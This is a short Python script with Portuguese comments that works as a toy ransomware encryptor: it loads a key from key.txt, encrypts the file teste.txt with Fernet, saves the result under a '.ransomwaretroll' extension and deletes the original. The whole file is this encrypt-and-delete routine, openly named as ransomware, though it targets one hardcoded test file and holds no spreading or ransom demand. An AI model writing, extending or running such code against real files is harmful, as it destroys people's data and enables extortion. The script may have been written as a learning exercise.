import os
from cryptography.fernet import Fernet as fer


# chave de criptografia

key = open("key.txt", "rb").read()

# abrir o arquivo a ser criptografado

file_name = "teste.txt"
file_data = open(file_name, "rb").read()

# Cria um objeto Fernet com a chave
fernet = fer(key)

# criptografia  do arquivo

encrypted_message = fernet.encrypt(file_data)

# salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"

open(new_file, "wb").write(encrypted_message)

# remover o arquivo
os.remove(file_name)

print('encrypted done...')
